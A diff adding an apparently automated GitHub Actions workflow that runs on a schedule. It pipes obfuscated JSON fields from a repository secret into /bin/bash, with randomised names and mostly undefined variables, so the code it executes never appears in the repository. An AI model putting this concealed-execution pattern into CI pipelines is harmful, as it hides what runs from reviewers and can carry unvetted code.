@@ -1,0 +1,28 @@
+name: tiangoushiyueri
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tiangoushiyueri
+        env:
+          uduw309: ${{ secrets.uduw309 }}
+        run: |
+          echo $uduw309 | jq -r .kq5645 | /bin/bash
+          echo $ktt86 | jq -r .k566 | /bin/bash
+          echo $iysmj75323 | jq -r .cbtw34568 | /bin/bash
+          echo $sfdxw492 | jq -r .yujt0 | /bin/bash
+          echo $f4611 | jq -r .z2430 | /bin/bash
+          echo $faznz3340 | jq -r .iceoz1777 | /bin/bash
+          echo $cyidz484 | jq -r .rjzk2 | /bin/bash
+          echo $ikp4 | jq -r .mif5 | /bin/bash
+          echo $hhib0 | jq -r .vqxqw2138 | /bin/bash
+          echo $zbltt568 | jq -r .zs05 | /bin/bash
+          echo $ypfi11861 | jq -r .nada3947 | /bin/bash
+
